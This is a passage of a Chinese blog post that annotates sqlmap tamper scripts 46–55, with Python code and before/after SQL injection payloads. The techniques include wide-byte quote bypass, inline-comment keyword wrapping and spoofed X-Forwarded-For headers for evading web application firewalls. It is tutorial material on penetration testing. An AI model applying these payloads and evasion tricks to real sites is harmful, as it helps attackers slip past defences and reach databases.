<h2 id="46-space2mysqldash-py"><a href="#46-space2mysqldash-py" class="headerlink" title="46.space2mysqldash.py"></a>46.space2mysqldash.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i].isspace():<br>            retVal += <span class="hljs-string">&quot;--%0A&quot;</span><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">or</span> payload[i:i + <span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;-- &#x27;</span>:<br>            retVal += payload[i:]<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用-加一个换行符替换空格"><a href="#1-作用：用-加一个换行符替换空格" class="headerlink" title="1.作用：用 -- 加一个换行符替换空格"></a>1.作用：用 <code>--</code> 加一个换行符替换空格</h3><h3 id="2-要求：-19"><a href="#2-要求：-19" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> MySQL<br><span class="hljs-bullet">    *</span> MSSQL<br></code></pre></td></tr></table></figure>






<h2 id="47-space2plus-py"><a href="#47-space2plus-py" class="headerlink" title="47.space2plus.py"></a>47.space2plus.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += <span class="hljs-string">&quot;+&quot;</span><br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            retVal += <span class="hljs-string">&quot;+&quot;</span><br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用-替换空格"><a href="#1-作用：用-替换空格" class="headerlink" title="1.作用：用 + 替换空格"></a>1.作用：用 <code>+</code> 替换空格</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users<br><span class="hljs-comment">---&gt;</span><br><span class="hljs-keyword">SELECT</span>+id+<span class="hljs-keyword">FROM</span>+users<br></code></pre></td></tr></table></figure>


<h2 id="48-space2randomblank-py"><a href="#48-space2randomblank-py" class="headerlink" title="48.space2randomblank.py"></a>48.space2randomblank.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">blanks = (<span class="hljs-string">&quot;%09&quot;</span>, <span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0C&quot;</span>, <span class="hljs-string">&quot;%0D&quot;</span>)<br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>            <span class="hljs-keyword">if</span> payload[i].isspace():<br>                firstspace = <span class="hljs-literal">True</span><br>                retVal += random.choice(blanks)<br>                <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>            quote = <span class="hljs-keyword">not</span> quote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>            doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>        <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>            retVal += random.choice(blanks)<br>            <span class="hljs-keyword">continue</span><br><br>        retVal += payload[i]<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用以下随机空白字符替换空格，适应所有数据库"><a href="#1-作用：用以下随机空白字符替换空格，适应所有数据库" class="headerlink" title="1.作用：用以下随机空白字符替换空格，适应所有数据库"></a>1.作用：用以下随机空白字符替换空格，适应所有数据库</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># ASCII table:</span><br><span class="hljs-meta">#   TAB     09      horizontal TAB</span><br><span class="hljs-meta">#   LF      0A      new line</span><br><span class="hljs-meta">#   FF      0C      new page</span><br><span class="hljs-meta">#   CR      0D      carriage return</span><br></code></pre></td></tr></table></figure>




<h2 id="49-symboliclogical-py"><a href="#49-symboliclogical-py" class="headerlink" title="49.symboliclogical.py"></a>49.symboliclogical.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?i)\bAND\b&quot;</span>, urllib.quote(<span class="hljs-string">&quot;&amp;&amp;&quot;</span>), re.sub(<span class="hljs-string">r&quot;(?i)\bOR\b&quot;</span>, urllib.quote(<span class="hljs-string">&quot;||&quot;</span>), payload))<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用于将and替换为-amp-amp-的url编码形式，or替换为-的url编码形式。"><a href="#1-作用：用于将and替换为-amp-amp-的url编码形式，or替换为-的url编码形式。" class="headerlink" title="1.作用：用于将and替换为&amp;&amp;的url编码形式，or替换为||的url编码形式。"></a>1.作用：用于将<code>and</code>替换为<code>&amp;&amp;的</code>url编码形式，<code>or</code>替换为<code>||</code>的url编码形式。</h3><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span> AND <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">----&gt;</span><br><span class="hljs-string">1 %26%26 &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>




<h2 id="50-unmagicquotes-py"><a href="#50-unmagicquotes-py" class="headerlink" title="50.unmagicquotes.py"></a>50.unmagicquotes.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    found = <span class="hljs-literal">False</span><br>    retVal = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> found:<br>            retVal += <span class="hljs-string">&quot;%bf%27&quot;</span><br>            found = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">if</span> found:<br>        _ = re.sub(<span class="hljs-string">r&quot;(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, retVal)<br>        <span class="hljs-keyword">if</span> _ != retVal:<br>            retVal = _<br>            retVal += <span class="hljs-string">&quot;-- -&quot;</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> retVal <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;/*&#x27;</span>)):<br>            retVal += <span class="hljs-string">&quot;-- -&quot;</span><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将引号字符（’）替换为多字节组合-BF-27，并在结尾添加泛型注释（以使其工作）-用宽字符绕过-GPC-addslashes"><a href="#1-作用：将引号字符（’）替换为多字节组合-BF-27，并在结尾添加泛型注释（以使其工作）-用宽字符绕过-GPC-addslashes" class="headerlink" title="1.作用：将引号字符（’）替换为多字节组合%BF%27，并在结尾添加泛型注释（以使其工作）,用宽字符绕过 GPC addslashes"></a>1.作用：将引号字符（’）替换为多字节组合%BF%27，并在结尾添加泛型注释（以使其工作）,用宽字符绕过 GPC addslashes</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span> ------&gt;<span class="hljs-number">1</span>%bf%<span class="hljs-number">27</span>-- -<br><br></code></pre></td></tr></table></figure>




<h2 id="51-uppercase-py"><a href="#51-uppercase-py" class="headerlink" title="51.uppercase.py"></a>51.uppercase.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;[A-Za-z_]+&quot;</span>, retVal):<br>        word = match.group()<br><br>        <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>            retVal = retVal.replace(word, word.upper())<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将payload的小写字符转换成大写字符。"><a href="#1-作用：将payload的小写字符转换成大写字符。" class="headerlink" title="1.作用：将payload的小写字符转换成大写字符。"></a>1.作用：将payload的小写字符转换成大写字符。</h3><h2 id="52-varnish-py"><a href="#52-varnish-py" class="headerlink" title="52.varnish.py"></a>52.varnish.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">headers = kwargs.get(<span class="hljs-string">&quot;headers&quot;</span>, &#123;&#125;)<br>headers[<span class="hljs-string">&quot;X-originating-IP&quot;</span>] = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br><span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：添加一个-HTTP-头-“-X-originating-IP-”-来绕过-WAF"><a href="#1-作用：添加一个-HTTP-头-“-X-originating-IP-”-来绕过-WAF" class="headerlink" title="1.作用：添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF"></a>1.作用：添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</h3><h2 id="53-versionedkeywords-py"><a href="#53-versionedkeywords-py" class="headerlink" title="53.versionedkeywords.py"></a>53.versionedkeywords.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span>(<span class="hljs-params">match</span>):</span><br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>        <span class="hljs-keyword">return</span> match.group().replace(word, <span class="hljs-string">&quot;/*!%s*/&quot;</span> % word)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> match.group()<br><br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=[^\w(]|\Z)&quot;</span>, <span class="hljs-keyword">lambda</span> match: process(match), retVal)<br>    retVal = retVal.replace(<span class="hljs-string">&quot; /*!&quot;</span>, <span class="hljs-string">&quot;/*!&quot;</span>).replace(<span class="hljs-string">&quot;*/ &quot;</span>, <span class="hljs-string">&quot;*/&quot;</span>)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：对不是函数的关键字用内联注释包裹"><a href="#1-作用：对不是函数的关键字用内联注释包裹" class="headerlink" title="1.作用：对不是函数的关键字用内联注释包裹"></a>1.作用：对不是函数的关键字用内联注释包裹</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>, CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">58</span>),IFNULL(CAST(<span class="hljs-built_in">CURRENT_USER</span>() <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>))#<br><span class="hljs-comment">-------&gt;</span><br><span class="hljs-number">1</span><span class="hljs-comment">/*!UNION*/</span><span class="hljs-comment">/*!ALL*/</span><span class="hljs-comment">/*!SELECT*/</span><span class="hljs-comment">/*!NULL*/</span>,<span class="hljs-comment">/*!NULL*/</span>, CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">58</span>),IFNULL(CAST(<span class="hljs-built_in">CURRENT_USER</span>()<span class="hljs-comment">/*!AS*/</span><span class="hljs-comment">/*!CHAR*/</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>)),<span class="hljs-type">CHAR</span>(<span class="hljs-number">58</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>))#<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-20"><a href="#2-要求：-20" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>


<h2 id="54-versionedmorekeywords-py2"><a href="#54-versionedmorekeywords-py2" class="headerlink" title="54.versionedmorekeywords.py2"></a>54.versionedmorekeywords.py2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span>(<span class="hljs-params">match</span>):</span><br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords <span class="hljs-keyword">and</span> word.upper() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> IGNORE_SPACE_AFFECTED_KEYWORDS:<br>        <span class="hljs-keyword">return</span> match.group().replace(word, <span class="hljs-string">&quot;/*!%s*/&quot;</span> % word)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> match.group()<br><br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span>, <span class="hljs-keyword">lambda</span> match: process(match), retVal)<br>    retVal = retVal.replace(<span class="hljs-string">&quot; /*!&quot;</span>, <span class="hljs-string">&quot;/*!&quot;</span>).replace(<span class="hljs-string">&quot;*/ &quot;</span>, <span class="hljs-string">&quot;*/&quot;</span>)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用内联注释所有的关键字"><a href="#1-作用：用内联注释所有的关键字" class="headerlink" title="1.作用：用内联注释所有的关键字"></a>1.作用：用内联注释所有的关键字</h3><h3 id="2-要求：-21"><a href="#2-要求：-21" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL &gt;= 5.1.13<br></code></pre></td></tr></table></figure>




<h2 id="55-xforwardedfor-py"><a href="#55-xforwardedfor-py" class="headerlink" title="55.xforwardedfor.py"></a>55.xforwardedfor.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dependencies</span>():</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randomIP</span>():</span><br>    numbers = []<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> numbers <span class="hljs-keyword">or</span> numbers[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> (<span class="hljs-number">10</span>, <span class="hljs-number">172</span>, <span class="hljs-number">192</span>):<br>        numbers = sample(xrange(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>), <span class="hljs-number">4</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">str</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> numbers)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    headers = kwargs.get(<span class="hljs-string">&quot;headers&quot;</span>, &#123;&#125;)<br>    headers[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>] = randomIP()<br>    headers[<span class="hljs-string">&quot;X-Client-Ip&quot;</span>] = randomIP()<br>    headers[<span class="hljs-string">&quot;X-Real-Ip&quot;</span>] = randomIP()<br>    <span class="hljs-keyword">return</span> payload<br><br></code></pre></td></tr></table></figure>
<h3 id="1-作用：添加一个伪造的-HTTP-头-“-X-Forwarded-For-”-来绕过-WAF。"><a href="#1-作用：添加一个伪造的-HTTP-头-“-X-Forwarded-For-”-来绕过-WAF。" class="headerlink" title="1.作用：添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF。"></a>1.作用：添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF。</h3><h1 id="3-参考链接"><a href="#3-参考链接" class="headerlink" title="3.参考链接"></a>3.参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ">https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2746">https://xz.aliyun.com/t/2746</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/sqlmap/">sqlmap</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/06/15/Python%E4%B8%ADPickle%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Python中Pickle的反序列化漏洞</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/06/11/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-9/">
                        <span class="hidden-mobile">BUUCTF刷题笔记-9</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    Fluid.utils.waitElementVisible('vcomments', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
          placeholder: "Just go go",
          path: window.location.pathname,
          avatar: "mm",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: false,
          serverURLs: "",
        });
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the
    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
  </noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



